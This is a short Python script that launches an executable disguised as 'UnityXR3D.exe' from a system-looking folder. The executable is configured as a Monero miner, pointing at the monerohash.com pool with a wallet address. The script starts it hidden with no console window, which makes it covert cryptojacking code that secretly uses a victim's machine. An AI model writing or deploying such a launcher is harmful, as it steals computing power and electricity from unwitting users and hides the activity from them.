import subprocess

path_to_UnityXR3D = "C:/windows_data/data_log/UnityXR3D.exe"

mining_level = 1

command = [
    path_to_UnityXR3D,
    "-o", "monerohash.com:9999",
    "-u", "46tucY8jBpVGPY1AmW49Agh1K4gEjNTrxBZ2DcGHD8jf53yJtTZNKeY4g5HtsyZwvp8ChDxawo4hsL21kzAmgHaN9ovVBbZ",
    "-k", "--tls",
    "-m", str(mining_level)
]


subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW)
